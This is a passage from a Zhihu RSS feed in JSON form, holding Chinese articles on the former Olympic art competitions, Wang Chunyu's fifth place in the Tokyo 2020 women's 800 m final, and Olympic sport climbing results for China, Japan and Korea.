data-original=\"https://pic2.zhimg.com/v2-2af535af5806ccb2a9015d0416781315_r.jpg\"><figcaption>顾拜旦的《奥林匹克宣言》手稿于2019年经苏富比拍卖，以6160万元成交。</figcaption></figure><p>于是，当1912年斯德哥尔摩承办奥运会的时候，顾拜旦就说，咱那些体育项目：田径、体操、帆船、马术……照常比，再加几条艺术的呗。斯德哥尔摩一开始是很不情愿的，但是最终还是同意增设绘画、雕塑、建筑、音乐、文学五个领域，各设金银铜牌。舞蹈、电影和摄影等形式一度也被纳入考量范围，但最终没有被采纳。参赛作品的体裁不限，但有一个要求——必须呼应体育运动主题和奥林匹克精神。</p>\n<p>这就有了前面咱们说的双料冠军沃尔特·威南斯，一个人赢下射击和雕塑两项金牌的逸事了。不过，老实说咱们这位奥运金牌得主并不是特别有名的艺术家，他的雕塑作品也是中规中矩。之所以他赢得金牌，其实也是矮子里面拔高个，第一届有艺术赛事的奥运会，五个项目加起来，才总共只有35人报名参加，按最终颁发15枚奖牌计算，等于每两个半人就能匀到一枚奖牌，竞争激烈程度比跑步、跳高可是低多了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-469b0713b53bb1afcd9a2eb475b54325_b.jpg\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1082\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic2.zhimg.com/v2-469b0713b53bb1afcd9a2eb475b54325_r.jpg\"><figcaption>1912年斯德哥尔摩奥运会海报，图画作者为奥洛夫·霍茲伯格，他的这幅画并没有参赛获奖</figcaption></figure><p>虽说一开始艺术赛事的热度不高，但顾拜旦并不打算就此打住。在接下来的几十年里，艺术赛事的参与度逐年增高，到1924年的时候，已经有193位各界艺术家参赛了，而竞赛项目也开始细分，绘画分出了油画、水彩素描、版画；建筑奖项分成两项：建筑和城市规划。只不过这两个类别有时候实在很难区分，有时候干脆会把这两个奖颁给同一个建筑作品。</p>\n<p>文学分出了戏剧、史诗和诗歌——这项赛事的参赛者必须使用英语或者法语参赛。有意思的是，咱们的顾拜旦爵爷为了炒高比赛热度，还曾使用化名乔治·欧罗德和马丁·艾芬巴赫参加诗歌项目赛事，最后乔治·欧罗德还真的赢了一枚金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a6a828dfff444c76015fdc9e646560bc_b.jpg\" data-size=\"normal\" data-rawwidth=\"320\" data-rawheight=\"320\" class=\"content_image\" width=\"320\"><figcaption>1924年巴黎奥运会金牌，可以看到左下角包含有竖琴等和艺术有关的元素</figcaption></figure><p>音乐赛事虽然分出了管弦乐、独奏和人声，但其实这些作品都是以乐谱的形式递交给组委会的，并不是像今天的选秀节目那样由乐手现场表演给评委。尽管评委们并非等闲之辈——音乐赛事评委中包括有伊戈尔·斯特拉文斯基这样的乐坛传奇，文学评委包括诺贝尔文学奖得主塞尔玛·拉格洛夫等，但在面对这「一页页」奥运选手时，评委们难免因艺术主张的分歧而难以达成共识。事实上，斯特拉文斯基担任音乐赛事评委的1924年奥运会根本没有颁发任何音乐奖牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f02397d5e205aebfd5dc3af966ec2294_b.jpg\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"967\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic1.zhimg.com/v2-f02397d5e205aebfd5dc3af966ec2294_r.jpg\"><figcaption>斯特拉文斯基的作品如《火鸟》、《春之祭》至今仍会在奥运会花样滑冰等赛事的配乐中出现</figcaption></figure><p>当然，颁不出奖一个原因可能是评委的标准高，另一个原因也是因为很多名声在外的艺术大师不太愿意参赛。这一时期咱们能叫得出名字的那些艺术家，比如毕加索、马蒂斯……全都没参加奥运会。一些艺术家不愿意和其他自己看不上的艺术家同台竞技，另有些艺术家不太愿意迎合奥运会的套路去命题作文——很多参加绘画赛事的艺术家为了能够吸引评委的眼球，都会选择绘制紧张刺激的拳击、橄榄球等主题作品。历史上唯一一位两届奥运会绘画金牌得主让·雅可比的得奖作品便是描绘足球运动中前锋和守门员争球的《角球》和橄榄球运动员激烈拼抢的《橄榄球》。它们为他分别赢得了一枚综合绘画金牌和素描金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-277013288ed3e3fed98dc50cd88eda8a_b.jpg\" data-size=\"normal\" data-rawwidth=\"448\" data-rawheight=\"700\" class=\"origin_image zh-lightbox-thumb\" width=\"448\" data-original=\"https://pic3.zhimg.com/v2-277013288ed3e3fed98dc50cd88eda8a_r.jpg\"><figcaption>让·雅可比，《角球》</figcaption></figure><p>因为上述种种原因，参加奥运会的艺术家们，与其说是艺术家，不如说是「符合奥运精神的资深艺术爱好者」。毕竟，早年间的奥运会非常强调「奥运精神第一，比赛成绩第二」，职业艺术家多仰赖销售作品为生，而奥运会又不想参赛者和钱挂钩，尤其是不想看到赢了金牌的艺术家作品价格变贵。所以当激进的保守派奥委会主席艾弗里·布伦戴奇上任后，他坚持要维护奥运会的纯洁，并力主将全部艺术赛事一次性开除出了奥运会——即便他自己也曾在1932年参与了奥运文学奖的赛事（并没有获得奖牌）。从那以后，这些艺术赛事就再也没有回归奥运大家庭。</p>\n<p>从1912年到1948年的7届奥运会中，总共有23个国家的艺术家赢得了总计147枚奖牌，其中获奖最少的国家是摩纳哥，1枚铜牌，意大利和法国这两个文化大国在金牌榜和总奖牌榜上均并列第二，分别是5枚金牌和14枚奖牌。最终赢得7届奥运会艺术项目金牌和奖牌最多的并不是如今奥运会的大热门中国、美国和俄罗斯，而是德国，他们总共赢得了7金、7银、9铜，总计23枚奖牌。在最后一届包含艺术奖项的奥运会，1948年伦敦奥运会上，英国版画家约翰·科普利以73岁高龄赢得了版画银牌，成为了奥运史上年龄最大的奖牌获得者。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-faefbcfeffcc484783efc4ba80f547cc_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"850\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-faefbcfeffcc484783efc4ba80f547cc_r.jpg\"><figcaption>蔡国强主持创作的「大脚印」是08奥运开幕式最早敲定下来的方案之一</figcaption></figure><p>奥运艺术赛事虽然就此打住了，却以另一种形式延续了下来，那就是花样翻新的开幕式和闭幕式。单就在北京举办的2008年夏季奥运会的开幕式来说，就是众多资深艺术工作者合力的成果。除了广为人知的总导演张艺谋，副导演张继钢、陈维亚管的是各种繁杂的事情。樊跃、王潮歌的大型空间演出经验丰富，蔡国强（大脚印焰火），陈丹青（滚动画轴），陈岩和韩立勋（美术总设计）、陈其钢（音乐）……等等。</p>\n<p>去年年底我在故宫看了蔡国强的个展「远行与归来」，里面有他以故宫收藏的《冰嬉图》为灵感创作的《银河嬉冰》，他也会继续为2022年冬奥会出工出力。或许咱可以借此想象，如果现在的奥运会还有艺术赛事，艺术家们会带来什么样的作品。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f703869f85101a7c16748dde2876f4f0_b.jpg\" data-size=\"normal\" data-rawwidth=\"4032\" data-rawheight=\"2520\" class=\"origin_image zh-lightbox-thumb\" width=\"4032\" data-original=\"https://pic1.zhimg.com/v2-f703869f85101a7c16748dde2876f4f0_r.jpg\"><figcaption>蔡国强的《银河嬉冰》</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-4d6f0abd0bf5851033560660f9579bdf_b.jpg\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"342\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic4.zhimg.com/v2-4d6f0abd0bf5851033560660f9579bdf_r.jpg\"><figcaption>《银河嬉冰》局部</figcaption></figure><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/weng-xin-79?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">翁昕</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/396372387?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价 2020 东京奥运会田径女子 800 米决赛王春雨创个人最好成绩获第 5 ？","date":"2021-08-05 06:15:55","description":"\n<p>赛后知道一个小细节，更加理解为何昨天王春雨从赛后直到媒体混采区，一直都在抽泣——她说，<b>自己赛前已经偷偷准备好了领奖服。</b></p>\n<p>尽管可能没有多少人（哪怕是自己人），会相信她能最终站台。</p>\n<p>带着眼泪的「个人最佳」和「创造历史」，特别令人动容。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-112a152b20eda49afd123ad3af2db783_720w.jpg?rss\" data-caption=\"2016年里约奥运，王春雨1分59秒93首次晋级奥运半决赛；2020东京奥运会，则再一次提升，跻身决赛并位列第五。图/Lucy Nicholson\" data-size=\"normal\" data-rawwidth=\"2160\" data-rawheight=\"1214\" data-watermark=\"watermark\" data-original-src=\"v2-112a152b20eda49afd123ad3af2db783\" data-watermark-src=\"v2-4956b549d15c880d2c1fdd08ad69dd77\" data-private-watermark-src=\"v2-c7474485f2d709ef6fb9468940bd0805\"></p>\n<p><br></p>\n<p>女子800米决赛的八名选手在昨天都是超水准的发挥，6人创造了PB（个人最佳）、1人创造了SB（赛季最佳）。包括冠军是美国新国家纪录（1分55秒21）、亚军是英国国家纪录（1分55秒88）。</p>\n<p><b>在这样一场几乎所有选手都拿出自己110%实力的「PB决战」中，王春雨的1分57秒00、第五名的成绩，含金量极高极高。</b></p>\n<p>对她个人来说，也是继半决赛后三天时间再次大幅PB，很厉害。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-caf7708210c60d1c1687b047e25ddb5f_720w.jpg?rss\" data-caption=\"NR是国家纪录，PB是个人最好成绩，SB是该选手本赛季最好成绩\" data-size=\"normal\" data-rawwidth=\"1748\" data-rawheight=\"630\" data-watermark=\"watermark\" data-original-src=\"v2-caf7708210c60d1c1687b047e25ddb5f\" data-watermark-src=\"v2-1631582542cd69aa97afbddacfa1317c\" data-private-watermark-src=\"v2-386ec9984fe4cf0526965c30d6b5df70\"></p>\n<p><br></p>\n<p>赛后王春雨说了一番话，</p>\n<p>“（第五）证明了自己是可以的，但还是遗憾没能站上领奖台。也许是自己水平不够，跟她们还有差距。”</p>\n<p>“<b>这个差距是可以训练出来的，我觉得自己有一天会战胜她们。</b>”</p>\n<hr>\n<p>复盘一下王春雨的东京奥运会之旅。</p>\n<p><br></p>\n<h3>7月30日第一轮，2分00秒05，小组第三晋级半决赛</h3>\n<p>王春雨东京奥运会前表现出的状态非常好，赛前20天曾在杭州跑过一场邀请赛，轻松跑出1分59秒18——<b>这是自1997年上海八运会以来、中国女子800米的最好成绩。</b></p>\n<p>这场比赛对王春雨来说只是奥运前的最后热身赛，并不算完全展现实力，也可见王春雨当下的状态和能力。</p>\n<p>东京的第一轮和半决赛只相隔一天，王春雨也尽量会以最低的消耗确保自己晋级、并在半决赛发挥。最终2分00秒05，小组第三，顺利晋级半决赛。</p>\n<p><br></p>\n<p>5年前的里约，王春雨已经晋级过奥运半决赛，当时她的实力和目标就是半决赛，第一轮就得全力输出（1分59秒93），到了半决赛位列小组第八（2分04秒05）。东京奥运会王春雨不管能力和目标显然都要远得多。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-91a07c34349015a138ad9285d8497c65_720w.jpg?rss\" data-caption=\"里约时，王春雨力拼进入半决赛，第一轮已经全力输出，最终半决赛2分04秒05小组第八\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"349\" data-watermark=\"watermark\" data-original-src=\"v2-91a07c34349015a138ad9285d8497c65\" data-watermark-src=\"v2-147bc558c219281709e80bfade701efd\" data-private-watermark-src=\"v2-ec7cccb094bbd797ae8ec4244083b753\"></p>\n<p><br></p>\n<h3>7月31日半决赛，1分59秒14，小组第二晋级决赛</h3>\n<p>前400米59秒5（第一）、后400米59秒6（最终小组第二），1分59秒14小幅刷新个人PB，小组仅落后基利·霍奇金森0.02秒（基利最终决赛拿了银牌）。</p>\n<p>顺利进入决赛。</p>\n<p><b>首位进入奥运会女子800米决赛的中国运动员，第二位进入决赛的亚洲选手——这个第二让整个亚洲等了近百年，上一次要追溯到1928年阿姆斯特丹奥运会的人见绢枝</b>（当时21岁的日本人人见绢枝拿了银牌，可惜她因为肺结核24岁就去世了）。</p>\n<p>后面是三天后的决赛。</p>\n<p><br></p>\n<h3>8月3日决赛，1分57秒00，第五</h3>\n<p>决赛对王春雨就是拼。这种拼甚至还有破釜沉舟的意味在里面，包括她不断给自己一些暗示，剑指名次、冲击领奖台——这也是很多人（包括我们自己人）兴许都并没有对王春雨报以如此高的期望，王春雨自己却有更高的要求。</p>\n<p><br></p>\n<p>一个细节，完成半决赛后王春雨还和记者开玩笑说，“下一场（决赛）我走完两圈也是第八了，<b>但我觉得我不可能是第八，我想拼一个更好的名次。</b>”</p>\n<p>最后看，这种高要求没有变为负担，相反成了很强的驱动力。</p>\n<p>特别棒。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-daf4159d3d5b7eb309f15164eca6983b_720w.jpg?rss\" data-caption=\"东京奥运会中国不少女选手都有自己的幸运小细节，比如杨倩的小黄鸭头饰、美甲，比如鲍珊菊/钟天使的毛主席佩章等，王春雨的幸运符就是红色蝴蝶结。\" data-size=\"normal\" data-rawwidth=\"2170\" data-rawheight=\"3000\" data-watermark=\"watermark\" data-original-src=\"v2-daf4159d3d5b7eb309f15164eca6983b\" data-watermark-src=\"v2-1293107dfbeaf2318a16ea47af1ab424\" data-private-watermark-src=\"v2-d611ed594dab7610a9c0ce8ef42585bd\"></p>\n<p><br></p>\n<p>解读一下决赛：</p>\n<p><br></p>\n<p>决赛王春雨第二道出发；</p>\n<p>800米内道选手，如果想争夺名次的话，并道后需要特别留意不能被外道选手给卡在里面，这样后面的突围和冲刺很容易失去自己的节奏。王春雨也是很担心这一点，所以并道后，她是想跟住美国人穆的（后来的冠军，1分55秒21）。不过并没能跟到穆后面；</p>\n<p>——看过比赛的应该会有印象，外圈选手并道的瞬间是很“凶”的，并道也是特别的决绝；</p>\n<p>此后王春雨的位置一直在3-5名间左右，<b>比赛前400米58秒2、排名第四</b>；</p>\n<p>比赛后半程看的很振奋。<b>王春雨中后段（大约600米处）有落到后面，一度让人觉得是不是就此会被落下</b>；</p>\n<p>然后她还是咬牙跟住了；</p>\n<p><b>迎来最后100米直道冲刺时，她的排名回到第六、在内道的位置。最后90米，王春雨突然很坚决的选择往外跑，转到了第三道开始最后冲刺</b>；</p>\n<p>后半程的落后，也是王春雨与穆、基利等选手实力差距的呈现。但王春雨丝毫没有稳妥完赛的意思，真的是毫无保留的拼了最后这段；</p>\n<p>美国的天才少女、19岁的穆最后和别人的差距越拉越大如愿第一个冲线。当时转播画面里王春雨也是大跨步的在冲，完全没有松懈；</p>\n<p>最后第五名完赛，落后铜牌罗杰斯0.18秒、第四简玛·里基0.1秒，其实互相之间的差距并不大。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b605f4ddb69994aa8a4c588d4ae417e8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2824\" data-rawheight=\"1796\" data-watermark=\"watermark\" data-original-src=\"v2-b605f4ddb69994aa8a4c588d4ae417e8\" data-watermark-src=\"v2-5dac5fc7d14ae975750ce64bd49e6d15\" data-private-watermark-src=\"v2-13249668e591f538b21400f4a57b3a42\"></p>\n<p><br></p>\n<p><b>1分57秒00，比自己三天前跑出的个人PB提升了整整2.14秒</b>，这显然是很超神的表现了——主观来讲，这种超神表现给予的震撼丝毫不亚于苏炳添前几天的9秒83。</p>\n<p>甚至于，可能是赛后到写这个回答、刚刚重新看遍比赛，以及王春雨自己的赛后复盘，还产生更多“好可惜啊”的感觉……</p>\n<p><br></p>\n<p>决赛的八位选手发挥真的都很出色，互相之间的竞争角逐也让每个人都跑出了很快的成绩。“其他人表现一般，王春雨这个发挥是否就拿牌了？”的假设客观来说，本质并不成立。</p>\n<p>这点要承认。</p>\n<p>也无法去奢求或者假象，如果王春雨跑得更快一些会怎样。这个26岁安徽姑娘，已经完全输出了自己的能力。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f3d373ba77d7bf67268d5e24a1c2efd0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5000\" data-rawheight=\"3333\" data-watermark=\"watermark\" data-original-src=\"v2-f3d373ba77d7bf67268d5e24a1c2efd0\" data-watermark-src=\"v2-5d5fa3872bea66d5b87f43e28501ddb8\" data-private-watermark-src=\"v2-1a2740533e0ce38823d5926f47c21c49\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-112a152b20eda49afd123ad3af2db783_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2160\" data-rawheight=\"1214\" data-watermark=\"watermark\" data-original-src=\"v2-112a152b20eda49afd123ad3af2db783\" data-watermark-src=\"v2-4956b549d15c880d2c1fdd08ad69dd77\" data-private-watermark-src=\"v2-c7474485f2d709ef6fb9468940bd0805\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-3df88e9dbadcf260482f6ccfd24c35e4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-3df88e9dbadcf260482f6ccfd24c35e4\" data-watermark-src=\"v2-e51fb00d57685dac7da7a313053d7db1\" data-private-watermark-src=\"v2-135681aaaa064958b3b3ac7e1f0f0682\"></p>\n<p><br></p>\n<p>王春雨亚锦赛、亚运会都已拿到过第一名，两届奥运会，里约和东京也已经最好的证明了自己的实力。</p>\n<p>三年后的巴黎奥运会，很难想象王春雨还会站上决赛。不过对东京赛后王春雨的这句话，还是坚信不疑——</p>\n<p>“<b>这个差距是可以训练出来的，我觉得自己有一天会战胜她们。</b>”</p>\n<p><br></p>\n<p>不光你觉得，我们也这样觉得。一定会的。</p>\n<p>兴许明年的杭州亚运会，王春雨依然会（在成绩上）更进一步。</p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/476493978/answer/2032949449\" class=\"internal\">2020 东京奥运跳水女子 3 米跳板决赛施廷懋、王涵包揽冠亚军，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476149568/answer/2029677017\" class=\"internal\">2020 东京奥运田径男子 10000 米埃塞俄比亚选手巴雷加夺得田径首金，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476000617/answer/2028599848\" class=\"internal\">如何评价 2020 东京奥运会游泳男子 200 米个人混合泳决赛汪顺夺金？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474850082/answer/2026108063\" class=\"internal\">奥运射击选手是如何看清靶子的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n</ul>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477063063/answer/2039110968?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">125 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/477050158?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价东京奥运会王春雨在800米决赛中的表现？</a><br><a href=\"http://www.zhihu.com/question/476608971?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价中国羽毛球队在东京奥运会上的比赛成绩？</a><br>\n","link":"http://www.zhihu.com/question/477063063/answer/2039110968?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价街舞（breaking）、滑板、攀岩和冲浪正式成为 2024 年巴黎奥运会比赛正式项目?","date":"2021-08-05 06:15:47","description":"\n<p>东京奥运会攀岩预赛结束更新：</p>\n<p>中日韩三国赛果如下：</p>\n<p>男子组：中国的小将潘愚非速度赛排名第20位，抱石赛排名第8位，难度攀登比赛排名第7位，最终总成绩第14位，无缘决赛；</p>\n<p>日本队，一哥Tomoa Narasaki发挥出色，不专攻速度赛的他爬出了5.94秒位居第2，抱石赛也高居第2，在基本已经确保晋级的情况下难度攀登轻松上阵排名第14，总成绩第2位进入决赛。另一名选手Kai Harada总成绩排名第18位，无缘决赛；</p>\n<p>韩国队唯一的入围选手Jongwon Chon排名第十与决赛失之交臂。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-86204dbc607449903f154aee883cf4a6_720w.jpg?rss\" data-caption=\"中国选手潘愚非在抱石比赛中，转自国际奥委会官方微博\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1349\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>女子组：专攻速度的中国小将宋懿龄速度赛爬出了6.46秒的好成绩，位居第3位，但是受到肩伤影响的她抱石赛排名第19位，难度攀登比赛排名第18位，最终总成绩第12位无缘决赛；</p>\n<p>日本队，老将Akiyo Noguchi和中生代选手Miho Nonaka分别以总成绩第4位和第3位晋级，毫无悬念；</p>\n<p>韩国队的天才少女Chae-hyun Seo在速度赛仅仅爬出第17名的情况下，抱石赛取得第5名，难度攀登更是豪取第1名，以总成绩第2名的成绩挺进决赛。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-acd6f6881d2abd2e952bf049c4afe3b1_720w.jpg?rss\" data-caption=\"中国选手宋懿龄在速度比赛中，转自国际奥委会官方微博\" data-size=\"normal\" data-rawwidth=\"1514\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>资格赛，中日韩三方的表现基本在笔者的预测范围内。中国两位小将其实需要发挥出自己的全部实力，加上一些些运气才可以晋级。只不过，潘愚非的速度赛稍微欠缺了一些运气，宋懿龄受到奥运会资格赛期间肩伤的影响并没有完全恢复，在战略性放弃抱石赛保存体力避免受伤的情况下难度攀登还是未能克服伤病影响。但是这一次他们的表现已经足够出色，中国的攀岩水平还在不断上升，让我们期待2024年巴黎奥运会速度攀岩和其他两项分开之后，这两位选手和其他中国选手的表现。</p>\n<p>这次奥运会，大家都是时隔很久看到大多数选手登场，所以也是对他们闭关修炼的一个检验。很明显日本队对于速度攀岩的训练得到了回报，潘愚非和韩国的小将Chae-hyun Seo也加强巩固了自己的抱石水平。</p>\n<p>今明天将是男子组和女子组的决赛，祝大家观赛愉快，享受比赛。</p>\n<hr>\n<p>攀岩项目首次进入了奥运，一众岩友的很多回答已经说到了攀岩的方方面面。攀岩首次入奥，中国国家队也是首次建立了一支优秀的攀岩队伍。这支国家队新队伍的诞生引起了我的关注。</p>\n<p>我就稍微聊聊选手，特别是着重聊一下中日韩三国的选手吧。</p>\n<p>中日韩三国在体坛也算相爱相杀多年，并且横跨多个体育项目，足球，篮球，排球，乒乓球，游泳，围棋，并且出现了很多个口口相传的动人故事。现在运动攀岩也进入了奥运大家庭，也算是为这三个国家之前的体育项目比拼又增添的新的一笔。</p>\n<p>笔者个人认为，在现在的攀岩大环境下，中日韩三国之间的关系跟早年的围棋大环境有相似之处：日本实力统治，韩国正在悄悄开始新时代，而中国目前无疑是三个国家中相对较弱的国家，但是前景无疑是光明的…</p>\n<p>先从最强大的日本开始说起。</p>\n<p><b>日本队 </b></p>\n<p><b>关键词：内卷</b></p>\n<p>提起日本队，笔者第一个会想到的是一个最近开始很流行的词语——内卷。</p>\n<p>日本队无疑是全亚洲，乃至于全世界，综合攀岩实力最强的国家。</p>\n<p>日本队有多强？我们用2019年国际攀联世界杯的各个分站赛数据来说话。为什么选用2019年？是因为2019年的时候攀岩在奥运会的比赛方式已经确定（综合），以及各位选手在2019国际攀联世界杯的积分将会被作为奥运资格的选拔方式之一，所以全世界的所有攀岩选手对2019年国际攀联世界杯都非常重视，而且在2019年，在日本的八王子分站赛，第一次出现了按照奥运会标准的综合比赛方式。</p>\n<p>下图是2019年国际攀联世界杯抱石比赛男子组各个分站赛的决赛成员，按照最终名次排列，其中标有绿色的是日本队选手：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0787fa3caba4cc402ecb346ab76c7f9c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"662\" data-rawheight=\"736\" data-watermark=\"watermark\" data-original-src=\"v2-0787fa3caba4cc402ecb346ab76c7f9c\" data-watermark-src=\"v2-63bc8a1d1ce147513cdefda09c428f54\" data-private-watermark-src=\"v2-acf6b6226900ce3763b9067ef1f86e42\"></p>\n<p>可以看到，除了德国慕尼黑站日本队稍显拉垮，没有成员进入前六以外，有两次分站赛有两人进入决赛，有两次分站赛有三人进入决赛，有两次分站赛有四人进入决赛，这个数目放眼任何一个国家都是统治级的。七次有三次冠军落入日本队手中。其中的两次冠军，由目前的日本男子第一人，外号“日本一哥”的Tomoa Nagasaki的获得。</p>\n<p>下图是2019年国际攀联世界杯抱石比赛女子组各个分站赛的决赛成员，按照最终名次排列，其中标有绿色的是日本队选手：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d3bc4372fbb74528aa2106f36879e46a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"736\" data-watermark=\"watermark\" data-original-src=\"v2-d3bc4372fbb74528aa2106f36879e46a\" data-watermark-src=\"v2-8262650633aaacd31ef707da0ba7e08b\" data-private-watermark-src=\"v2-365ae70b09e30b66a2ab560dffa5364c\"></p>\n<p>相比男子组，女子组的统治力也并没有逊色，只是由于2019年是斯洛文尼亚选手Janja Garnbret状态爆炸的一年，日本女队难夺一冠。一直被Janja压制的这位日本选手，正是老来焕发第二春，状态更胜壮年的日本女子第一人，Akiyo Noguchi。</p>\n<p>相比抱石被日本队统治，先锋和速度攀岩相对百花齐放一些。那么，综合这三项考核的攀岩比赛，日本队会不会因此受到影响呢？</p>\n<p>结论是…是的，日本队受到了影响，统治力更加强大了。以下是八王子站综合排名：</p>\n<p>男子组：</p>\n<p>冠军归属日本，前六名四位日本选手。 </p>\n<p><img src=\"https://pic3.zhimg.com/v2-e82d31bb2d8c1d3729336f9a55d3ffed_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1269\" data-rawheight=\"363\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>女子组：</p>\n<p>最好成绩亚军，前六名三位日本选手。 </p>\n<p>所以在攀岩界，有着世界对抗日本的传说…</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8342ad202823b2e9c6e2b927fb85b8a8_720w.jpg?rss\" data-caption=\"网上的调侃世界对抗日本的攀岩表情包\" data-size=\"normal\" 